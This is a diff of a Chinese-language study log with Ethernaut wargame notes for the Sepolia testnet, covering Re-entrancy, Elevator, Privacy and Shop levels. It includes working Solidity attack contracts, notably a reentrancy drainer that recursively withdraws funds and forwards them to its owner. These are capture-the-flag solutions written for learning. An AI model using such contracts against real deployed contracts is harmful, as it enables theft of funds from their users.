@@ -18,6 +18,7 @@ timezone: Asia/Shanghai
 1. eth sepolia rpc: https://eth-sepolia.public.blastapi.io
 2. 现在测试网水龙头变得麻烦了，要求主网要有余额。
 水龙头：https://sepolia-faucet.pk910.de/#/
+       https://www.alchemy.com/faucets/ethereum-sepolia
 3. 测试1部署合约：0x480Ee5663698aA065B3c971722eda3e835ce024d
 4. 根据教程一步步执行，最后通过 authenticate 方法提交答案
 #### Ethernaut - Fallback
@@ -105,5 +106,94 @@ contract AttackKing {
 
 }
 ```
+
+### 2024.09.02
+#### Ethernaut - Re-entrancy
+合约地址：0x84841B92767187f235B67690Db1179f7E6307faC
+可以对 withdraw 使用重入攻击
+需要特别注意，重入攻击不能放在 constructor 中。因为在创建合约时，fallback/receive函数内容可能还没有被初始化，会是空的
+```
+contract AttackReentracy {
+    address payable public  _reentracy;
+    address payable public _owner;
+
+    constructor( address payable reentracy, address payable owner) public payable {
+        _reentracy = reentracy;
+        _owner = owner;
+    }
+
+    function withdraw() external payable {
+        // 1. 往目标合约捐款
+        Reentrance(_reentracy).donate{value: 0.001 ether}(address(this));
+        // 2. 调用目标合约取款
+        Reentrance(_reentracy).withdraw(1000000000000000);
+        // 3. 给owner转账
+        payable(_owner).transfer(address(this).balance);
+    }
+
+    fallback() external payable { 
+        Reentrance(_reentracy).withdraw(1000000000000000);
+    }
+
+    receive() external payable {
+        Reentrance(_reentracy).withdraw(1000000000000000);
+    }
+}
+```
+### 2024.09.03
+#### Ethernaut - Elevator
+合约地址：0x5cE212358a2D77fcd4cE431a33E5eDe2C3453C4d
+题目要求构造一个合约，并且在一次交易的两次调用中，返回不同的值
+```
+contract BuildingImpl is Building {
+    uint public top = 0;
+    
+    function isLastFloor(uint256) external returns (bool) {
+        top++;
+        return top == 2;
+    }
+
+    // 0x5cE212358a2D77fcd4cE431a33E5eDe2C3453C4d
+    function attack(address elevator) external   {
+        Elevator elevatorContract = Elevator(elevator);
+        elevatorContract.goTo(1);
+    }
+}
+```
+
+### 2024.09.04
+#### Ethernaut - Privacy
+Vault 的进阶版，需要通过web3js获取存储的数据，需要学习下evm中是如何存储数据的
+合约地址：0x57c70Fd38b1D9B453013EF0b6021B926EA131E6e
+
+### 2024.09.05
+#### Ethernaut - Shop
+可以实现一个动态的 被调用函数
+合约地址：0x2eafa118534F7B4652d7e7Ee5e2d6146d32E620e
+```
+contract BuyerImpl {
+    address public shopAddress;
+    
+    constructor() {}
+    
+    function setShopAddress(address _shopAddress) public  {
+        shopAddress = _shopAddress;
+    }
+
+    function payForShop(address _shopAddress) payable public {
+        Shop _shop = Shop(_shopAddress);
+        _shop.buy();
+    }
+
+    function price() external view returns (uint256) {
+        Shop _shop = Shop(shopAddress);
+        if (_shop.isSold()) {
+            return 1;
+        }
+        return 101;
+    }
+}
+```
+
 
 <!-- Content_END -->
